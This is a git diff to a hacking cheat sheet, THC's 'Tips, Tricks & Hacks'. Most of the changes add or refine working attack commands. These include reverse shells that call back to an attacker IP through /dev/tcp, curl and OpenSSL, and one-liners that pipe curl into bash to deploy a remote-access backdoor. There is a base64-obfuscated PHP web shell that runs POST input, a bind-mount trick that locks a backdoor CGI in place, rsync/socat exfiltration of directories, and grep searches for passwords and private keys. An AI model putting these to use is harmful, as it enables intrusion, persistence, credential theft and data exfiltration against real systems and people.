@@ -1,6 +1,7 @@
 <!-- Use `grip 8080` to render the markdown locally -->
 # THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
+https://thc.org/tips  
 https://tinyurl.com/thctips
 
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
@@ -79,6 +80,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Restore the date of a file](#restore-timestamp)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
+   1. [Make a file immutable](#perm-files)
+   1. [Change user without sudo/su](#nosudo)
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
@@ -605,17 +608,14 @@ DSTIP=1.2.3.4
 DPORT=443
 echo 1 >/proc/sys/net/ipv4/ip_forward
 
-iptables -t mangle -I PREROUTING -p tcp --dport ${FPORT:?} -m addrtype --dst-type LOCAL -j MARK --set-mark 1188 
-iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+iptables -t mangle -C PREROUTING -j CONNMARK --restore-mark || iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+iptables -t mangle -A PREROUTING -p tcp --dport ${FPORT:?} -m addrtype --dst-type LOCAL -j MARK --set-mark 1188 
 
 iptables -t nat -I PREROUTING -p tcp -m mark --mark 1188 -j DNAT --to ${DSTIP:?}:${DPORT:?}
 iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
 
 iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
 iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
-
-iptables -t mangle -I INPUT -m mark --mark 1188 -j ACCEPT
-iptables -t mangle -I INPUT -j CONNMARK --restore-mark
 ```
 
 We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
@@ -748,10 +748,10 @@ timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
 
 HashCat is our go-to tool for everything else:
 ```shell
-hashcat --username -w3 my-hash /usr/share/wordlists/rockyou.txt
+hashcat my-hash /usr/share/wordlists/rockyou.txt
 ```
 
-Or using a [7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask) on GPU:
+Or using a [10-days 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/) on GPU:
 ```sh
 curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
 # -d2 == Use GPU #2 only (device #2)
@@ -759,8 +759,13 @@ curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010
 # -w1 == workload low (-w3 == high)
 nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
 ```
+Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions).
 
-Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions) or use [Crackstation](https://crackstation.net), [shuck.sh](https://shuck.sh/), [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or crack on your own [AWS](https://akimbocore.com/article/hashcracking-with-aws/).
+Be aware that `$6$` hashes are SLOW. Even the [1-minute 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/01%20instant_1-minute/1-minute_7-16.hcmask) would take many days on a 8xRTX4090 cluster to complete.
+
+Rent a GPU-Cluster at [vast.ai](https://www.vast.ai) and use [dizcza/docker-hashcat](https://hub.docker.com/r/dizcza/docker-hashcat) ([read more](https://adamsvoboda.net/password-cracking-in-the-cloud-with-hashcat-vastai/)).
+
+Otherwise, use [Crackstation](https://crackstation.net), [shuck.sh](https://shuck.sh/), [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or crack on your own [AWS](https://akimbocore.com/article/hashcracking-with-aws/) instances.
 
 **3.xi. Brute Force Passwords / Keys**
 
@@ -1066,7 +1071,7 @@ gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
 #### Download from Server to Receiver:
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
-python -m http.server 8080
+python -m http.server 8080 # --bind 127.0.0.1
 ```
 
 ```sh
@@ -1154,25 +1159,36 @@ The same encrypted (OpenSSL):
 
 Receiver:
 ```posh
-openssl req -subj '/CN=thc/O=EXFIL/C=XX' -new -newkey rsa:2048 -sha256 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
+# use rsa:2048 if ed25519 is not supported (e.g. rsync connection error)
+openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
 cat ssl.key ssl.crt >ssl.pem
 rm -f ssl.key ssl.crt
 mkdir upload
+cat ssl.pem
 socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
 ```
 
 Sender:
 ```posh
 # Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
+IP=1.2.3.4
+PORT=31337
 # Using rsync + socat-ssl
-rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- ./warez  0:
-
+up1() {
+   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
+}
 # Using rsync + openssl
-rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- ./warez  0:
+up2() {
+   rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
+}
+up1 /var/www/./warez
+up2 /var/www/./warez
 ```
 
 Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
 (To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
+
+Pro Tip: Lazy hackers just type `exfil` on segfault.net.
 
 ---
 <a id="webdav"></a>
@@ -1233,7 +1249,7 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 <a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat (encrypted)**
 
-Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
+Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
 X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
@@ -1254,6 +1270,12 @@ Start netcat to listen on port 1524 on your system:
 ```sh
 nc -nvlp 1524
 ```
+After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
+```sh
+pwncat -lp 1524
+# Press "Ctrl-C" if pwncat gets stuck at "registerd new host ...".
+# Then type "back" to get the prompt of the remote shell.
+```
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
@@ -1270,6 +1292,7 @@ bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 
 Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
 ```sh
+# On YOUR workstation
 # Generate SSL keys:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
 # Start your listening server:
@@ -1296,14 +1319,18 @@ C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul
 **5.i.e. Reverse shell with OpenSSL (encrypted)**
 
 ```sh
+# On YOUR workstation:
 # Generate SSL keys:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
 # Start your listening server:
 openssl s_server -port 1524 -cert cert.pem -key key.pem
+# Or pwncat:
+# pwncat -lp 1524 --ssl
 ```
+
 ```sh
-# On the target:
-{ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
+# On the target, start an openssl reverse shell as background process:
+({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
 ```
 
 <a id="reverse-shell-no-bash"></a>
@@ -1423,12 +1450,12 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo opost; fg
 ```
 
-```
+```sh
 # On target host
 export SHELL=/bin/bash
 export TERM=xterm-256color
-reset
-stty rows 24 columns 120
+reset -I
+stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "$R"|awk -F";" '{ printf "rows "$3" cols "$2; }')
 # Pimp up your prompt
 PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 ```
@@ -1458,7 +1485,7 @@ or
 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
 ```
 
-or deploy gsocket by running their own deployment server:
+or deploy gsocket by running your own deployment server:
 ```sh
 LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/xs)"  # Notice '/xs' instead of '/x'
 ```
@@ -1521,9 +1548,8 @@ Other methods:
 
 Add this line to the beginning of any PHP file:
 ```php
-<?php $i=base64_decode("aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9");eval($i);?>
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
 ```
-(Thanks @dono for making this 3 bytes smaller than the smallest)
 
 Test the backdoor:
 ```sh
@@ -1583,7 +1609,7 @@ wfind() {
     arr=("$@")
     while [[ ${#arr[@]} -gt 0 ]]; do
         dir=${arr[${#arr[@]}-1]}
-        unset 'arr[${#arr[@]}-1]'
+        unset "arr[${#arr[@]}-1]"
         find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
         IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
     done
@@ -1592,13 +1618,21 @@ wfind() {
 # Usage: wfind /etc /var /usr 
 ```
 
-Find local passwords:
+Find local passwords (using noseyparker):
 ```sh
 curl -fsSL https://github.com/praetorian-inc/noseyparker/releases/download/v0.16.0/noseyparker-v0.16.0-x86_64-unknown-linux-gnu.tar.gz | tar xvfz - --transform="flags=r;s|.*/||" --no-anchored  --wildcards noseyparker && \
 ./noseyparker scan . && \
 ./noseyparker report
 ```
 (Or use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history)
+
+Using `grep`:
+```sh
+# Find passwords (without garbage).
+grep -HEronasir  '.{16}password.{,64}' .
+# Find TLS or OpenSSH keys:
+grep -r -F -- " PRIVATE KEY-----" .
+```
 
 ---
 <a id="shell-hacks"></a>
@@ -1612,10 +1646,9 @@ shred -z foobar.txt
 
 ```sh
 ## SHRED without shred command
-shred()
-{
+shred() {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
-    dd bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
     rm -f "${1:?}"
 }
 shred foobar.txt
@@ -1677,6 +1710,27 @@ Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). H
 ```sh
 mkdir $'\t'
 cd $'\t'
+```
+
+<a id="perm-files"></a>
+**8.v. Make a file immuteable**
+
+This will redirect `/var/www/cgi/blah.cgi` to `/boot/backdoor.cgi`. The file `blah.cgi` can not be modified or removed (unless unmounted).
+```sh
+# /boot/backdoor.cgi contains our backdoor
+touch /var/www/cgi/blah.cgi
+mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
+```
+
+<a id="nosudo"></a>
+**8.vi. Change user without sudo/su**
+
+Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | convert - jpg:screenshot.jpg`)
+```bash
+U=$(id -u UserName) ### <-- Set UserName
+H="$(grep "$U" /etc/passwd | cut -d: -f6)"
+HOME="${H:-/tmp}" python3 -c "import os;os.setuid(${U:?});os.execl('/bin/bash', '-bash')"
+# change -bash to bash to not make this a login shell.
 ```
 
 ---
@@ -1984,6 +2038,7 @@ OpSec
 5. [EFF](https://www.eff.org/) - Clever advise for freedom figthers.
 
 Exploits
+1. [SploitScan](https://github.com/xaitax/SploitScan) - Exploit Score & PoC search (by xaitax)
 1. [Traitor](https://github.com/liamg/traitor) - Tries various exploits/vulnerabilities to gain root (LPE)
 1. [PacketStorm](https://packetstormsecurity.com) - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
 1. [ExploitDB](https://www.exploit-db.com) - Also includes metasploit db and google hacking db
@@ -2077,7 +2132,7 @@ Telegram Channels<a id="channels"></a>
 Mindmaps & Knowledge
 1. [Compass Sec Cheat Sheets](https://github.com/CompassSecurity/Hacking_Tools_Cheat_Sheet)
 2. [Network Pentesting](https://github.com/wearecaster/NetworkNightmare/blob/main/NetworkNightmare_by_Caster.png)
-1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
+1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg)
 
 <a id="cool-linux-commands"></a>
 **13.ii. Cool Linux commands**
